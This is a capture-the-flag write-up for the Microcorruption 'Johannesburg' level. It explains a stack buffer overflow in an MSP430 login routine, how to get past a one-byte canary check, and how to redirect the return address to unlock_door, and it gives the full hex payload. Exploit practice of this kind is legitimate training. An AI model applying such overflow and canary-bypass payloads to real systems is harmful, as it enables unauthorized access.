# MicroCTF Writeup


Author: [Ankur Kumar](https://github.com/awsoankur) 

Level: Johannesburg

## Walkthrough
In the login function we can see it printing that the password must be between 8 -16 
characters.
Thus we know that the password must be more than that.
the line `4546:  3e40 3f00      mov	#0x3f, r14` tells us that the password can be 64 bytes 
long.
now entering a long ass chain of 'a' as the password and upon obsering the disassembly we can 
see the code being oveerwritten.
On observing the login function carefully.
```
4562:  0f93           tst	r15
4564:  0524           jz	#0x4570 <login+0x44>
4566:  b012 4644      call	#0x4446 <unlock_door>
456a:  3f40 d144      mov	#0x44d1 "Access granted.", r15
456e:  023c           jmp	#0x4574 <login+0x48>
4570:  3f40 e144      mov	#0x44e1 "That password is not correct.", r15
4574:  b012 f845      call	#0x45f8 <puts>
4578:  f190 0600 1100 cmp.b	#0x6, 0x11(sp)
457e:  0624           jeq	#0x458c <login+0x60>
4580:  3f40 ff44      mov	#0x44ff "Invalid Password Length: password too long.", r15
4584:  b012 f845      call	#0x45f8 <puts>
4588:  3040 3c44      br	#0x443c <__stop_progExec__>
458c:  3150 1200      add	#0x12, sp
4590:  3041           ret
```
there is no way of calling the `unlock_door` function as it will always be jumped over.
so we try to return this funtion from login itself .
For the flow of execution to reach the return of login we need the condition 
```4578:  f190 0600 1100 cmp.b	#0x6, 0x11(sp)```to be true so the execution doesn't
stop immidietly.
So lets find out which offset of our payload should have what. 
For this we need the address of the function as the sp when the the return statment is being 
executed and also the position where the byte is being compared
In order to find this we simply `break 4590` and `break 4578`enter the train od 'a' again.
Then note the offset where the payload should should have the canary and the return address.
at line 4578 we have `sp  43ec`.
And the password entered is also stored at the same address so at offsset `0x11` we need to enter the byte `06` follwed by the address of the function `4644` in the little endian way.
so the payload must be : `6969696969696969696969696969696969064644`
and we are good to go.
## Password
`6969696969696969696969696969696969064644`
